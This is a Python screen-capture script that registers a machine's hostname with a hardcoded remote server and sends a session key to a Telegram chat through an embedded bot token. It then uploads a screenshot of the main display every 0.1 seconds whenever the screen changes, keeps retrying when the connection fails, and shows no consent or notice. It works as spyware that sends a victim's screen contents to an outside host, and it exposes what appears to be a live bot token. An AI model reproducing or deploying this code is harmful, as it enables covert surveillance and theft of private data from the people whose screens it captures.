import mss
import mss.tools
from PIL import Image
import io
import requests
import time
import uuid
import socket
import asyncio
import logging

from telegram import Bot

DEFAULT_HOST = 'http://5.35.90.82:5000/'
TELEGRAM_BOT_TOKEN = '5207577524:AAFWyFgWKd_yZCzSqiULfKNZ2GQb8yWI-h0'
RECONNECT_DELAY = 5  # Delay in seconds before attempting to reconnect

# Configure logging to log errors to a file
logging.basicConfig(filename='error.log', level=logging.ERROR)

def generate_unique_key():
    return str(uuid.uuid4())[:4]  # Generates a random UUID and takes the first 4 characters

async def send_key_to_telegram(key):
    bot = Bot(token=TELEGRAM_BOT_TOKEN)
    chat_id = '984573662'  # Replace with the actual chat ID
    await bot.send_message(chat_id=chat_id, text=f'New key generated: {key}')

def send_key_to_server(host, key, computer_name):
    try:
        r = requests.post(f'{host}/new_session', json={'_key': key, 'computer_name': computer_name})
        if r.status_code != 200:
            print('Server not available.')
            return False
        return True
    except requests.RequestException as e:
        print(f'Connection error: {e}')
        return False

def capture_and_send_screenshot(sct, host, key):
    monitor = sct.monitors[1]
    screenshot = sct.grab(monitor)
    img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)

    with io.BytesIO() as image_data:
        img.save(image_data, 'PNG')
        image_data_content = image_data.getvalue()

    return image_data_content

def main(host=DEFAULT_HOST, key=None):
    try:
        if key is None:
            key = generate_unique_key()

        computer_name = socket.gethostname()

        while not send_key_to_server(host, key, computer_name):
            print(f'Retrying in {RECONNECT_DELAY} seconds...')
            time.sleep(RECONNECT_DELAY)

        asyncio.run(send_key_to_telegram(key))

        prev_img = None
        with mss.mss() as sct:
            while True:
                image_data_content = capture_and_send_screenshot(sct, host, key)

                if image_data_content != prev_img:
                    files = {}
                    filename = str(round(time.time() * 1000)) + '_' + key
                    files[filename] = ('img.png', image_data_content, 'multipart/form-data')

                    try:
                        r = requests.post(f'{host}/capture_post', files=files)
                        if r.status_code != 200:
                            raise requests.RequestException('Failed to post capture.')
                    except requests.RequestException as e:
                        print(f'Error sending screenshot: {e}')
                        while not send_key_to_server(host, key, computer_name):
                            print(f'Retrying in {RECONNECT_DELAY} seconds...')
                            time.sleep(RECONNECT_DELAY)

                    prev_img = image_data_content
                else:
                    # print('no desktop change')
                    pass

                time.sleep(0.1)

    except Exception as e:
        # Log the error instead of crashing
        logging.error("An error occurred: %s", e)
        print("An error occurred. Please check the error log for details.")

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        # Log the error and suppress the error window
        logging.error("A critical error occurred: %s", e)
        print("A critical error occurred. Please check the error log for details.")
